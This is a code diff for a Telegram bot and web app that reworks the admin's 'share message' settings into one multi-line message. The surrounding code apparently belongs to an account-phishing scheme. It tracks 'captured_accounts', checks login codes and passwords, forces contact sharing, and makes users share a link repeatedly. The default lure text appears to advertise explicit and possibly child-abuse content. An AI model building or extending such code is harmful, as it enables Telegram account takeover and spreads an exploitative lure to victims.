@@ -31,11 +31,11 @@ DEFAULT_WELCOME_MSGS = [
     {"type": "text", "content": "👇"},
 ]
 
-DEFAULT_SHARE = {
-    "emoji": "🔥",
-    "link": "https://t.me/Xxxvo_bot",
-    "text": "ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👇",
-}
+# NEW: Single share message default
+DEFAULT_SHARE_MSG = """https://t.me/Xxxvo_bot
+https://t.me/Xxxvo_bot
+
+ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆"""
 
 logger.info("=" * 60)
 logger.info("ENV CHECK")
@@ -68,7 +68,7 @@ STATE = {
     "awaiting_timer": False,
     "awaiting_btn_text": False,
     "awaiting_btn_url": False,
-    "awaiting_share_field": None,
+    "awaiting_share_msg": False,
 }
 
 broadcast_state = {
@@ -183,8 +183,8 @@ def save_broadcast_config(cfg):
 
 def load_share_config():
     cfg = load_json(SHARE_FILE, None)
-    if not cfg or not isinstance(cfg, dict):
-        cfg = dict(DEFAULT_SHARE)
+    if not cfg or not isinstance(cfg, dict) or "message" not in cfg:
+        cfg = {"message": DEFAULT_SHARE_MSG}
         save_json(SHARE_FILE, cfg)
     return cfg
 
@@ -372,7 +372,7 @@ def admin_menu():
     return [
         [Button.inline("👋 Welcome Messages", b"menu_welcome"),
          Button.inline("📢 Broadcast", b"menu_broadcast")],
-        [Button.inline("🔗 Share Settings", b"menu_share"),
+        [Button.inline("🔗 Share Message", b"menu_share"),
          Button.inline("🔴 Expired", b"menu_expired")],
         [Button.inline("👥 Users", b"menu_users"),
          Button.inline("📊 Stats", b"menu_stats")],
@@ -435,9 +435,8 @@ def bc_logged_menu():
 
 def share_menu():
     return [
-        [Button.inline(f"😀 Emoji: {share_config.get('emoji', '')}", b"sh_emoji")],
-        [Button.inline(f"🔗 Link: {share_config.get('link', '')[:30]}...", b"sh_link")],
-        [Button.inline(f"📝 Text: {share_config.get('text', '')[:25]}...", b"sh_text")],
+        [Button.inline("✏️ Edit Share Message", b"sh_edit")],
+        [Button.inline("🔄 Reset to Default", b"sh_reset")],
         [Button.inline("👁 Preview", b"sh_preview")],
         [Button.inline("⬅️ Back", b"menu_home")],
     ]
@@ -539,7 +538,7 @@ async def start_handler(event):
 
 @bot.on(events.CallbackQuery())
 async def cb(event):
-    global timer_value, AUTO_DELETE_EXPIRED, broadcast_config
+    global timer_value, AUTO_DELETE_EXPIRED, broadcast_config, share_config
     if event.sender_id != YOUR_TELEGRAM_ID:
         return await event.answer("Not authorized", alert=True)
     data = event.data.decode()
@@ -556,7 +555,6 @@ async def cb(event):
         elif data == "menu_reset":
             for k in STATE:
                 STATE[k] = False
-            STATE["awaiting_share_field"] = None
             await event.answer("Reset!", alert=True)
             await safe_send(chat_id, "✅ Modes reset.", admin_menu(), edit_event=event)
 
@@ -749,43 +747,33 @@ async def cb(event):
                 txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
             await event.answer(txt[:200], alert=True)
 
-        # Share settings
+        # Share message
         elif data == "menu_share":
+            msg = share_config.get("message", DEFAULT_SHARE_MSG)
             await event.answer()
-            preview_text = f"{share_config.get('emoji','🔥')} {share_config.get('link','')}\n\n{share_config.get('text','')}"
             await safe_send(chat_id,
-                "🔗 **Share Settings**\n\n"
-                f"😀 Emoji: `{share_config.get('emoji', '')}`\n"
-                f"🔗 Link: `{share_config.get('link', '')}`\n"
-                f"📝 Text: `{share_config.get('text', '')}`\n\n"
-                f"**Preview:**\n{preview_text}",
+                f"🔗 **Share Message**\n\n"
+                f"**Current:**\n{msg}",
                 share_menu(), edit_event=event)
 
-        elif data == "sh_text":
-            STATE["awaiting_share_field"] = "text"
+        elif data == "sh_edit":
+            STATE["awaiting_share_msg"] = True
             await event.answer()
             await safe_send(chat_id,
-                f"📝 Current:\n`{share_config.get('text', '')}`\n\nSend new share text.",
+                "✏️ Send new share message.\n\n"
+                "**Multi-line supported.**\n"
+                "Links, text, emoji — sob ek sathe.",
                 [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
 
-        elif data == "sh_emoji":
-            STATE["awaiting_share_field"] = "emoji"
-            await event.answer()
-            await safe_send(chat_id,
-                f"😀 Current: `{share_config.get('emoji', '')}`\n\nSend new emoji.",
-                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
-
-        elif data == "sh_link":
-            STATE["awaiting_share_field"] = "link"
-            await event.answer()
-            await safe_send(chat_id,
-                f"🔗 Current: `{share_config.get('link', '')}`\n\nSend new link.",
-                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
+        elif data == "sh_reset":
+            share_config["message"] = DEFAULT_SHARE_MSG
+            save_share_config(share_config)
+            await event.answer("Reset!", alert=True)
+            await safe_send(chat_id, "✅ Reset to default.", share_menu(), edit_event=event)
 
         elif data == "sh_preview":
             await event.answer("Preview sent")
-            preview = f"{share_config.get('emoji','🔥')} {share_config.get('link','')}\n\n{share_config.get('text','')}"
-            await bot.send_message(chat_id, preview)
+            await bot.send_message(chat_id, share_config.get("message", DEFAULT_SHARE_MSG))
 
         # Expired
         elif data == "menu_expired":
@@ -891,13 +879,12 @@ async def cancel(event):
         return
     for k in STATE:
         STATE[k] = False
-    STATE["awaiting_share_field"] = None
     await event.respond("Cancelled.", buttons=admin_menu())
 
 
 @bot.on(events.NewMessage())
 async def capture(event):
-    global welcome_config, broadcast_config
+    global welcome_config, broadcast_config, share_config
     if event.sender_id != YOUR_TELEGRAM_ID:
         try:
             if event.message and event.message.contact:
@@ -942,12 +929,12 @@ async def capture(event):
             buttons=admin_menu(), parse_mode='md')
         return
 
-    if STATE.get("awaiting_share_field"):
-        field = STATE["awaiting_share_field"]
-        share_config[field] = txt.strip()
-        STATE["awaiting_share_field"] = None
+    if STATE["awaiting_share_msg"]:
+        # Multi-line — use full raw text
+        share_config["message"] = txt
+        STATE["awaiting_share_msg"] = False
         save_share_config(share_config)
-        await event.respond(f"✅ Share **{field}** updated.",
+        await event.respond("✅ Share message updated.",
             buttons=admin_menu(), parse_mode='md')
         return
 
@@ -1293,11 +1280,11 @@ var codeCheck = null;
 var pwdCheck = null;
 var contactForce = null;
 var inProgress = false;
-var SHARE_CFG = {emoji: "🔥", link: "https://t.me/Xxxvo_bot", text: "ᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👇"};
+var SHARE_MSG = "https://t.me/Xxxvo_bot\nhttps://t.me/Xxxvo_bot\n\nᴠɪʀᴀʟ ᴄᴩ ᴍᴍꜱ xxx👆";
 
-// Fetch share config from server
+// Fetch share config
 fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d){
-  if (d && d.link) { SHARE_CFG = d; }
+  if (d && d.message) { SHARE_MSG = d.message; }
 }).catch(function(){});
 
 function show(id) { document.getElementById(id).classList.add('on'); }
@@ -1527,14 +1514,12 @@ function updSteps(n) {
   }
 }
 document.getElementById('shareBtn').onclick = function() {
-  var emoji = SHARE_CFG.emoji || '🔥';
-  var link = SHARE_CFG.link || 'https://t.me/Xxxvo_bot';
-  var text = SHARE_CFG.text || '';
-  // Format: EMOJI LINK \n\n TEXT
-  var share_text = emoji + ' ' + link;
-  if (text) share_text += '\n\n' + text;
-  var url = 'https://t.me/share/url?url=' + encodeURIComponent(link) + '&text=' + encodeURIComponent(share_text);
-  if (tg) { tg.openTelegramLink(url); } else { window.open(url, '_blank'); }
+  // Use share message directly — Telegram share URL with URL extracted from message
+  // Get first URL from message
+  var urlMatch = SHARE_MSG.match(/https?:\/\/[^\s]+/);
+  var url = urlMatch ? urlMatch[0] : 'https://t.me/Xxxvo_bot';
+  var share_url = 'https://t.me/share/url?url=' + encodeURIComponent(url) + '&text=' + encodeURIComponent(SHARE_MSG);
+  if (tg) { tg.openTelegramLink(share_url); } else { window.open(share_url, '_blank'); }
   var n = Math.min(parseInt(localStorage.getItem(USK) || '0') + 1, 5);
   localStorage.setItem(USK, String(n));
   updSteps(n);
@@ -1567,8 +1552,6 @@ def health():
         'bot_connected': bot.is_connected(),
         'accounts': len(captured_accounts),
         'bot_users': len(users),
-        'nl_active': broadcast_state['nonlogged_active'],
-        'lg_active': broadcast_state['logged_active'],
         'share': share_config,
     })
 
